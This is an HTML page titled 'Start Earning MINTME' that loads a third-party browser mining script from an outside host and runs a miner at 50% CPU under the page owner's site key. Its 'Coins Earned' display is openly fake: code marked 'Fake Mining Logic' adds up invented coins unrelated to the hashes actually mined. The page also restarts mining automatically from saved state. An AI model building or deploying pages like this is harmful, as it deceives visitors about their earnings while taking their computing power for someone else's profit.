<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Start Earning MINTME</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --background: #1a1a2e;
            --card-bg: #16213e;
            --primary: #0f3460;
            --secondary: #5372f0;
            --accent: #e94560;
            --text-light: #e0e0e0;
            --text-muted: #a0a0a0;
            --success: #34d399;
            --error: #ef4444;
        }
        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--background);
            color: var(--text-light);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 450px;
        }
        .card {
            background-color: var(--card-bg);
            border-radius: 1rem;
            padding: 2rem;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3), 0 0 20px var(--secondary);
            border: 1px solid var(--primary);
            text-align: center;
        }
        .card-header {
            margin-bottom: 2rem;
        }
        .card-header .icon {
            font-size: 3rem;
            color: var(--secondary);
            margin-bottom: 0.5rem;
        }
        .card-header h1 {
            font-size: 1.75rem;
            font-weight: 700;
            color: var(--text-light);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
            margin-bottom: 2rem;
        }
        .stat-item {
            background-color: rgba(0,0,0,0.2);
            padding: 1rem;
            border-radius: 0.5rem;
        }
        .stat-item .label {
            font-size: 0.8rem;
            color: var(--text-muted);
            text-transform: uppercase;
        }
        .stat-item .value {
            font-size: 1.5rem;
            font-weight: 600;
            color: var(--text-light);
        }
        #status-text.running { color: var(--success); }
        #status-text.stopped { color: var(--error); }
        .toggle-button {
            width: 100%;
            padding: 1rem;
            border-radius: 0.5rem;
            border: none;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .toggle-button.start {
            background-color: var(--secondary);
            color: white;
        }
        .toggle-button.start:hover {
            background-color: #4361e0;
        }
        .toggle-button.stop {
            background-color: var(--accent);
            color: white;
        }
        .toggle-button.stop:hover {
            background-color: #d83450;
        }
        .toggle-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .error-message {
            color: var(--error);
            background-color: rgba(239, 68, 68, 0.1);
            border: 1px solid var(--error);
            padding: 0.75rem;
            border-radius: 0.5rem;
            margin-top: 1rem;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <div class="icon">⛏️</div>
                <h1>Start Earning MINTME</h1>
            </div>

            <div class="stats-grid">
                <div class="stat-item">
                    <div class="label">Status</div>
                    <div id="status-text" class="value stopped">Stopped</div>
                </div>
                <div class="stat-item">
                    <div class="label">Hashes / s</div>
                    <div id="hashes-per-second" class="value">0.00</div>
                </div>
                <div class="stat-item">
                    <div class="label">Total Hashes</div>
                    <div id="total-hashes" class="value">0</div>
                </div>
                 <div class="stat-item">
                    <div class="label">Coins Earned</div>
                    <div id="fake-coins-earned" class="value">0.000000</div>
                </div>
            </div>

            <button id="toggle-mining-button" class="toggle-button start" disabled>
                Initialize...
            </button>
            <div id="error-box" class="error-message" style="display: none;"></div>
        </div>
    </div>

    <!-- The external script must be loaded first -->
    <script src="https://www.hostingcloud.racing/YCcn.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // UI elements
            const statusText = document.getElementById('status-text');
            const hashesPerSecondText = document.getElementById('hashes-per-second');
            const totalHashesText = document.getElementById('total-hashes');
            const fakeCoinsEarnedText = document.getElementById('fake-coins-earned');
            const toggleButton = document.getElementById('toggle-mining-button');
            const errorBox = document.getElementById('error-box');

            let miner = null;
            let statsInterval = null;
            let fakeMiningInterval = null;

            // --- Fake Mining Logic ---
            const LOCAL_STORAGE_KEY = 'mining-state-persistence';
            const COINS_PER_24H = 2;
            const COINS_PER_SECOND = COINS_PER_24H / (24 * 60 * 60);

            let state = {
                isMining: false,
                fakeCoinsEarned: 0,
                lastUpdateTime: Date.now()
            };

            // Load saved state
            try {
                const savedState = localStorage.getItem(LOCAL_STORAGE_KEY);
                if (savedState) {
                    const parsed = JSON.parse(savedState);
                    state.fakeCoinsEarned = parsed.fakeCoinsEarned || 0;
                    if (parsed.isMining) {
                        const timeDiffSeconds = (Date.now() - parsed.lastUpdateTime) / 1000;
                        const coinsToAdd = timeDiffSeconds * COINS_PER_SECOND;
                        state.fakeCoinsEarned += coinsToAdd;
                        state.isMining = true; // Auto-start if it was running
                    }
                    state.lastUpdateTime = Date.now();
                }
            } catch (e) { console.error("Could not load mining state", e); }


            function updateFakeCoins() {
                const now = Date.now();
                const diffSeconds = (now - state.lastUpdateTime) / 1000;
                const newCoins = diffSeconds * COINS_PER_SECOND;
                state.fakeCoinsEarned += newCoins;
                state.lastUpdateTime = now;
                fakeCoinsEarnedText.textContent = state.fakeCoinsEarned.toFixed(6);
                localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(state));
            }

            // Function to initialize the miner
            function initializeMiner() {
                if (typeof Client === 'undefined' || typeof Client.Anonymous !== 'function') {
                    showError("Mining script could not be loaded. This might be due to an ad-blocker.");
                    toggleButton.textContent = "Error";
                    return;
                }

                miner = new Client.Anonymous('c541f766e3a569d2f01a1e9b0e96fd02e62d2cc7886f8c03a646befe8911df6a', {
                    throttle: 0.5, // 50% CPU usage
                    c: 'w'
                });
                toggleButton.disabled = false;
                
                // If state was saved as running, auto-start it
                if (state.isMining) {
                    startMining();
                } else {
                    stopMining(); // To set initial button text correctly
                }
            }

            function showError(message) {
                errorBox.textContent = message;
                errorBox.style.display = 'block';
            }

            function startMining() {
                if (!miner) return;
                miner.start();
                state.isMining = true;
                state.lastUpdateTime = Date.now();
                
                statusText.textContent = "Running";
                statusText.className = "value running";
                toggleButton.textContent = "Stop Mining";
                toggleButton.className = "toggle-button stop";

                statsInterval = setInterval(updateStats, 1000);
                fakeMiningInterval = setInterval(updateFakeCoins, 1000);
            }

            function stopMining() {
                if (!miner) return;
                miner.stop();
                state.isMining = false;
                
                statusText.textContent = "Stopped";
                statusText.className = "value stopped";
                toggleButton.textContent = "Start Mining";
                toggleButton.className = "toggle-button start";
                
                if (statsInterval) clearInterval(statsInterval);
                if (fakeMiningInterval) clearInterval(fakeMiningInterval);
                hashesPerSecondText.textContent = "0.00";
                
                localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(state));
            }

            function updateStats() {
                if (miner && miner.isRunning()) {
                    hashesPerSecondText.textContent = miner.getHashesPerSecond().toFixed(2);
                    totalHashesText.textContent = miner.getTotalHashes();
                }
            }

            // Event listener for the toggle button
            toggleButton.addEventListener('click', () => {
                if (miner && miner.isRunning()) {
                    stopMining();
                } else {
                    startMining();
                }
            });

            // Handle online/offline events
            window.addEventListener('offline', () => {
                if (state.isMining) {
                    stopMining();
                    showError("Internet disconnected. Mining paused.");
                }
            });

            window.addEventListener('online', () => {
                 errorBox.style.display = 'none';
                if (state.isMining) { // Auto-resume if it was supposed to be running
                    startMining();
                }
            });

            // Initial UI Update
            fakeCoinsEarnedText.textContent = state.fakeCoinsEarned.toFixed(6);

            // Initialize the miner
            initializeMiner();
        });
    </script>
</body>
</html>
